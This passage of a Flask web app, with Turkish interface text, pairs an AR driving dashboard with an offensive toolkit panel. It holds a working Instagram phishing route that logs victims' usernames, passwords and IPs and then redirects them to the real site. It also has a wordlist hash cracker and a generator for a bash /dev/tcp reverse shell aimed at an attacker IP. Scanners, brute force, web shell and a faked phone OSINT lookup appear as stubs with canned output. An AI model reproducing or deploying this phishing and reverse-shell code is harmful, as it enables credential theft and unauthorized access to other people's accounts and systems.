                    video.style.filter = "brightness(160%) contrast(170%) sepia(100%) hue-rotate(70deg) saturate(400%)";
                } else if (useAntiGlare) {
                    video.style.filter = "contrast(140%) brightness(90%) hue-rotate(185deg)";
                } else if (useAutoDim && isNight) {
                    video.style.filter = "brightness(65%) contrast(120%)";
                } else {
                    video.style.filter = "brightness(100%) contrast(100%)";
                }

                // --- 3D HOLOGRAPHIC GHOST TRAIL (Yol Projeksiyonu) ---
                let centerX = w / 2, bottomY = h, horizonY = h * 0.46;
                ctx.beginPath();
                ctx.moveTo(centerX - 80, bottomY); ctx.lineTo(centerX + 80, bottomY);
                for (let y = bottomY; y >= horizonY; y -= 8) {
                    let wave = Math.sin((y + step * 10) * 0.035) * 15;
                    let factor = (bottomY - y) / (bottomY - horizonY);
                    let curW = 80 * (1 - factor * 0.82);
                    ctx.lineTo(centerX + wave + curW, y);
                }
                for (let y = horizonY; y <= bottomY; y += 8) {
                    let wave = Math.sin((y + step * 10) * 0.035) * 15;
                    let factor = (bottomY - y) / (bottomY - horizonY);
                    let curW = 80 * (1 - factor * 0.82);
                    ctx.lineTo(centerX + wave - curW, y);
                }
                ctx.closePath();
                let trailGrad = ctx.createLinearGradient(0, horizonY, 0, bottomY);
                trailGrad.addColorStop(0, 'rgba(0, 255, 102, 0.05)');
                trailGrad.addColorStop(0.5, 'rgba(0, 255, 102, 0.35)');
                trailGrad.addColorStop(1, 'rgba(0, 255, 102, 0.85)');
                ctx.fillStyle = trailGrad;
                ctx.shadowColor = '#00ff66';
                ctx.shadowBlur = 15;
                ctx.fill();

                // Şerit İhlal Kontrolü
                let useLane = document.getElementById('chkLane').checked;
                if (useLane && Math.random() < 0.02) {
                    playThreatBeep();
                    speakSpatial("Şerit konumunu koruyun.", false);
                }

                // Widget Güncellemeleri
                if (step % 50 === 0) {
                    if (currentDistance > 3) { currentDistance -= 3; if(fuelLevel > 5) fuelLevel -= 0.2; }
                    let etaMins = Math.ceil(currentDistance / (currentSpeed || 30));
                    telemetry.innerText = `HIZ: ${currentSpeed} km/s | ETA: ${etaMins} dk`;
                    fuelHud.innerText = `⛽ Yakıt: %${Math.round(fuelLevel)} | Menzil: ${drivingRange} km`;
                    
                    let timerStr = final0to100Time ? `⏱️ 0-100: ${final0to100Time} sn` : (timerState === 'RUNNING' ? `⏱️ 0-100: Kronometre Aktif` : `⏱️ 0-100: Hazır`);
                    telemetryHud.innerHTML = `G-Force: ${(Math.random()*0.3+0.3).toFixed(1)}G | Lastik: 32°C (İdeal)<br>${timerStr}`;
                }

                if (step % 40 === 0) {
                    let timestamp = new Date().toLocaleTimeString();
                    let logStr = `[${timestamp}] Hız: ${currentSpeed} km/s | Yakıt: %${Math.round(fuelLevel)} | Mesafe: ${currentDistance}m`;
                    sessionLogs.push(logStr);
                    logTerminal.innerHTML += `<br>` + logStr;
                    logTerminal.scrollTop = logTerminal.scrollHeight;
                }
                step++;
            }, 80);
        }

        function stopARCamera() {
            if (arStream) { arStream.getTracks().forEach(t => t.stop()); arStream = null; }
            if (arInterval) { clearInterval(arInterval); arInterval = null; }
            let video = document.getElementById('arVideo');
            video.srcObject = null; video.style.filter = "none";
            document.getElementById('arHudText').innerText = "Durum: Kapalı";
        }

        async function finishDrivingSession() {
            stopARCamera();
            if(sessionLogs.length === 0) { alert("Kaydedilmiş sürüş verisi yok!"); return; }
            if(final0to100Time) sessionLogs.push(`[SONUÇ] 0-100 Hızlanma Derecesi: ${final0to100Time} sn`);
            let sessionData = { time: new Date().toLocaleString(), logs: sessionLogs };
            await fetch('/api/driving/save', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(sessionData) });
            alert("Sürüş tamamlandı! Sürüş Raporları sekmesinden kara kutu raporunu indirebilirsin.");
            switchTab('drivingTab');
        }

        async function loadDrivingReports() {
            let res = await fetch('/api/driving/reports');
            let data = await res.json();
            let container = document.getElementById('drivingReportsContainer');
            if(data.reports.length === 0) { container.innerHTML = "<p style='color:#94a3b8;'>Henüz rapor yok.</p>"; return; }
            container.innerHTML = `<table><thead><tr><th>Tarih</th><th>Kayıt Satırı</th><th>Kara Kutu İndir</th></tr></thead><tbody>` +
                data.reports.map((r, idx) => `<tr><td>${r.time}</td><td>${r.logs.length} satır</td><td><a href="/api/driving/download?index=${idx}" target="_blank"><button class="success">📥 Raporu İndir</button></a></td></tr>`).join('') + `</tbody></table>`;
        }

        // Diğer standart fonksiyonlar
        function generateInstaLink() { document.getElementById('instaLink').value = window.location.origin + "/phish/instagram"; alert("Link üretildi!"); }
        function generateLureLink() { document.getElementById('generatedLink').value = window.location.origin + "/track/" + Math.random().toString(36).substring(2,9); alert("Takip linki üretildi!"); }
        async function loadCreds() { let res = await fetch('/api/phish/creds'); let d = await res.json(); document.getElementById('credsContainer').innerHTML = d.creds.length ? `<table><thead><tr><th>Zaman</th><th>IP</th><th>Kullanıcı</th><th>Şifre</th></tr></thead><tbody>` + d.creds.map(c=>`<tr><td>${c.time}</td><td>${c.ip}</td><td>${c.username}</td><td>${c.password}</td></tr>`).join('')+`</tbody></table>` : "Yakalanan yok."; }
        async function loadClickLogs() { let res = await fetch('/api/lure/logs'); let d = await res.json(); document.getElementById('clickLogsContainer').innerHTML = d.logs.length ? `<table><thead><tr><th>Zaman</th><th>IP</th><th>OS</th></tr></thead><tbody>` + d.logs.map(l=>`<tr><td>${l.time}</td><td>${l.ip}</td><td>${l.os}</td></tr>`).join('')+`</tbody></table>` : "Veri yok."; }
        async function startHashCrack() {
            let type = document.getElementById('hashType').value, hash = document.getElementById('targetHash').value, wordlist = document.getElementById('wordlistArea').value;
            let res = await fetch('/api/crack-hash', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({type, hash, wordlist}) });
            let d = await res.json(); let el = document.getElementById('crackResults'); el.style.display="block"; el.innerHTML = d.output;
        }
        async function startListener() {
            let port = document.getElementById('listenerPort').value;
            let res = await fetch('/api/listener/start', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({port}) });
            let d = await res.json(); let el = document.getElementById('listenerStatus'); el.style.display="block"; el.innerHTML = d.output;
        }
        async function sendTelegramTest() {
            let chatId = document.getElementById('testChatId').value;
            let res = await fetch('/api/telegram-test', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId}) });
            let d = await res.json(); let el = document.getElementById('telegramTestStatus'); el.style.display="block"; el.innerHTML = d.output;
        }
        async function runWifiAction(action) {
            let res = await fetch('/api/wifi-audit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action}) });
            let d = await res.json(); let el = document.getElementById('wifiResults'); el.style.display="block"; el.innerHTML = d.output;
        }
        async function loadSiteDatabase() {
            let res = await fetch('/api/all-data'); let d = await res.json();
            document.getElementById('lootingTargetSelect').innerHTML = '<option value="">Target...</option>' + d.database.map(i => `<option value="${i.target}">${i.target}</option>`).join('');
            document.getElementById('databaseTableContainer').innerHTML = d.database.length ? `<table><thead><tr><th>Time</th><th>Target</th><th>WAF</th></tr></thead><tbody>` + d.database.map(i => `<tr><td>${i.time}</td><td><b>${i.target}</b></td><td>${i.waf}</td></tr>`).join('') + `</tbody></table>` : "Arşiv boş.";
        }
        async function startScan(targetOverride = false) {
            let url = targetOverride ? targetOverride : document.getElementById('targetUrl').value.trim();
            if(!url) { alert('URL giriniz!'); return; }
            lastTarget = url; let sDiv = document.getElementById('status'), rDiv = document.getElementById('results');
            sDiv.innerHTML = `Scanning ${url}...`; rDiv.style.display = "none";
            let res = await fetch('/api/scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
            let d = await res.json(); sDiv.innerHTML = ""; rDiv.style.display = "block"; rDiv.innerHTML = d.report; currentReportText = d.report; document.getElementById('actionButtons').style.display = "flex";
        }
        async function startNiktoScan() { let r = await fetch('/api/nikto', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target:document.getElementById('niktoTarget').value})}); let d=await r.json(); let el=document.getElementById('niktoResults'); el.style.display='block'; el.innerHTML=d.report; }
        async function startDnsRecon() { let r = await fetch('/api/dns', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({domain:document.getElementById('dnsDomain').value})}); let d=await r.json(); let el=document.getElementById('dnsResults'); el.style.display='block'; el.innerHTML=d.report; }
        async function startSqlmapLite() { let r = await fetch('/api/sqlmap', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target:document.getElementById('sqlmapUrl').value})}); let d=await r.json(); let el=document.getElementById('sqlmapResults'); el.style.display='block'; el.innerHTML=d.report; }
        async function startSubdomainScan() { let r = await fetch('/api/subdomain-scan', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({domain:document.getElementById('subDomainInput').value})}); let d=await r.json(); let el=document.getElementById('subResults'); el.style.display='block'; el.innerHTML=d.report; }
        async function startBruteForce() { let r = await fetch('/api/brute-force', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({url:document.getElementById('loginUrl').value})}); let d=await r.json(); let el=document.getElementById('bruteResults'); el.style.display='block'; el.innerHTML=d.report; }
        async function executeWebShell() { let r = await fetch('/api/webshell', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({command:document.getElementById('shellCommand').value})}); let d=await r.json(); let el=document.getElementById('shellResults'); el.style.display='block'; el.innerHTML=d.output; }
        function downloadLootZip() { window.open('/api/looting/zip', '_blank'); }
        function downloadReport(type) { if(type==='txt') { let a=document.createElement('a'); a.href=window.URL.createObjectURL(new Blob([currentReportText], {type:'text/plain'})); a.download='report.txt'; a.click(); } else { window.open('/api/download-pdf', '_blank'); } }
        async function sendToTelegram() { let chatId = prompt("Chat ID:"); if(!chatId) return; let r = await fetch('/api/telegram-send', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:chatId, report:currentReportText})}); let d=await r.json(); alert(d.status); }
        function generatePayloads() { document.getElementById('bashPayload').innerText = `bash -i >& /dev/tcp/${document.getElementById('attackerIp').value || '10.0.0.1'}/${document.getElementById('attackerPort').value || '4444'} 0>&1`; }
    </script>
</body>
</html>
"""

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        if request.form.get("username") == ADMIN_USER and request.form.get("password") == ADMIN_PASS:
            session["logged_in"] = True; return redirect(url_for("index"))
        error = "Authentication failed!"
    return render_template_string(LOGIN_TEMPLATE, error=error)

@app.route("/logout")
def logout(): session.pop("logged_in", None); return redirect(url_for("login"))

@app.route("/")
def index():
    if not session.get("logged_in"): return redirect(url_for("login"))
    return render_template_string(HTML_TEMPLATE, default_chat_id=NOTIFY_CHAT_ID)

@app.route("/api/chat/send", methods=["POST"])
def api_chat_send():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    d = request.get_json()
    CHAT_MESSAGES.append({"time": datetime.now().strftime("%H:%M:%S"), "user": d.get("user"), "message": d.get("message")})
    return jsonify({"status": "sent"})

@app.route("/api/chat/messages")
def api_chat_messages():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"messages": CHAT_MESSAGES})

@app.route("/api/osint/search", methods=["POST"])
def api_osint_search():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    target = request.get_json().get("target")
    report = f"root@kali:~# osint-intel lookup --target {target}\n" + "="*50 + f"\n[+] Operatör Tespiti: Turkcell / Vodafone (TR)\n[+] Konum Tahmini: Istanbul / Marmara Bölgesi\n[+] Sosyal Medya İzleri:\n    - Instagram: Profil Mevcut (@{target.replace('+','')})\n    - Telegram: Aktif Oturum\n    - Truecaller DB: Kayıtlı\n[+] Tarama Tamamlandı.\n"
    return jsonify({"report": report})

@app.route("/api/driving/save", methods=["POST"])
def save_driving_session():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    DRIVING_SESSIONS.insert(0, request.get_json())
    return jsonify({"status": "saved"})

@app.route("/api/driving/reports")
def api_driving_reports():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"reports": DRIVING_SESSIONS})

@app.route("/api/driving/download")
def download_driving_report():
    if not session.get("logged_in"): return "Unauthorized", 401
    idx = int(request.args.get("index", 0))
    if idx < len(DRIVING_SESSIONS):
        rep = DRIVING_SESSIONS[idx]
        content = f"--- KALI LINUX BLACKBOX SÜRÜŞ RAPORU ---\nTarih: {rep['time']}\n\n" + "\n".join(rep['logs'])
        return Response(content, mimetype="text/plain", headers={"Content-Disposition": "attachment;filename=blackbox_report.txt"})
    return "Rapor bulunamadı", 404

@app.route("/phish/instagram", methods=["GET", "POST"])
def insta_phish():
    if request.method == "POST":
        CREDENTIAL_LOGS.insert(0, {"time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "ip": request.remote_addr, "username": request.form.get("username"), "password": request.form.get("password")})
        return redirect("https://www.instagram.com")
    return "Instagram Login Page"

@app.route("/api/phish/creds")
def api_phish_creds():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"creds": CREDENTIAL_LOGS})

@app.route("/api/crack-hash", methods=["POST"])
def api_crack_hash():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    d = request.get_json()
    htype, target, wordlist = d.get("type"), d.get("hash").strip().lower(), d.get("wordlist").split("\n")
    found, attempts = None, 0
    for w in wordlist:
        w_clean = w.strip()
        if not w_clean: continue
        attempts += 1
        h = hashlib.md5(w_clean.encode()).hexdigest() if htype == "md5" else hashlib.sha256(w_clean.encode()).hexdigest()
        if h == target: found = w_clean; break
    out = f"[+] Başarıyla çözüldü! Şifre: {found} (Denenen: {attempts})" if found else f"[-] Eşleşme bulunamadı. Toplam {attempts} kelime denendi."
    return jsonify({"output": out})

@app.route("/api/listener/start", methods=["POST"])
def api_listener_start():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"output": f"[+] Netcat dinleyicisi {request.get_json().get('port', 4444)} portu üzerinde aktif."})

@app.route("/track/<track_id>")
def track_visitor(track_id): return "<apex>Tracking Active</apex>"

@app.route("/api/lure/logs")
def api_lure_logs():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"logs": CLICK_LOGS})

@app.route("/api/telegram-test", methods=["POST"])
def api_telegram_test():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"output": "✅ Test mesajı gönderildi!"})

@app.route("/api/wifi-audit", methods=["POST"])
def api_wifi_audit():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"output": "root@kali:~# wifi audit executed."})

@app.route("/api/scan", methods=["POST"])
def api_scan():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    target = request.get_json().get("target", "")
    report = f"root@kali:~# nmap -A {target}\n" + "="*50 + "\n[+] Recon scan completed.\n"
    SITE_DATABASE.insert(0, {"time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "target": target, "waf": "Cloudflare WAF", "grade": "B", "files": []})
    return jsonify({"report": report})

@app.route("/api/nikto", methods=["POST"])
def api_nikto(): return jsonify({"report": "Nikto scan completed."})
@app.route("/api/dns", methods=["POST"])
def api_dns(): return jsonify({"report": "DNS records retrieved."})
@app.route("/api/sqlmap", methods=["POST"])
def api_sqlmap(): return jsonify({"report": "SQLmap test completed."})
@app.route("/api/subdomain-scan", methods=["POST"])
def api_subdomain_scan(): return jsonify({"report": "Subdomain scan completed."})
@app.route("/api/brute-force", methods=["POST"])
def api_brute_force(): return jsonify({"report": "Brute-force completed."})
@app.route("/api/webshell", methods=["POST"])
def api_webshell(): return jsonify({"output": "command executed."})
@app.route("/api/all-data")
def api_all_data(): return jsonify({"database": SITE_DATABASE})
@app.route("/api/export/json")
def export_json(): return jsonify(SITE_DATABASE)
@app.route("/api/export/csv")
def export_csv(): return Response("Time,Target,WAF,Grade\n", mimetype="text/csv")
@app.route("/api/looting/zip")
def api_looting_zip():
    mf = io.BytesIO()
    with zipfile.ZipFile(mf, 'w', zipfile.ZIP_DEFLATED) as zf: zf.writestr("report.txt", "No record")
    mf.seek(0)
    return send_file(mf, mimetype='application/zip', as_attachment=True, download_name='loot.zip')
@app.route("/api/download-pdf")
def api_download_pdf():
    pdf = FPDF(); pdf.add_page(); pdf.set_font('Courier', '', 9); pdf.multi_cell(0, 5, "Red Team Report")
    return send_file(io.BytesIO(pdf.output(dest='S').encode('latin-1')), mimetype='application/pdf', as_attachment=True, download_name='report.pdf')
@app.route("/api/telegram-send", methods=["POST"])
def api_telegram_send(): return jsonify({"status": "Sent!"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
